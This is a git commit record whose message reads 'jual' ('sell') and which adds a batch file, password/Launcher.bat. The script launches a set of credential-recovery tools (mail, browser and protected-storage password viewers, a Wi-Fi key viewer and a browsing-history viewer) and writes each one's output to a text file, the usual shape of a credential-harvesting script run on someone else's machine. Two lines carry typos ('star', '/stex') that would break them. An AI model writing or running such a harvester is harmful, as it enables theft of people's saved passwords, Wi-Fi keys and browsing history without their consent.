ff1e9d1aabbfa6e249ef2f51b0334155227b50e9
Gitti339 <adetyagittisintia@gmail.com>
2020-03-28 22:39:37 -0700

    jual

---
+++ password/Launcher.bat
@@ -0,0 +1,6 @@
+start mspass.exe /stext mspass.txt
+start mail.exe /stext mailpv.txt
+star WebBrowserPassView.exe /stext WebBrowserPassView.txt
+start pspv.exe /stex spsv.txt
+start WirelessKeyView.exe /stext WirelessKeyView.txt
+start BrowsingHistoryView.exe /stext BrowsingHistoryView.txt
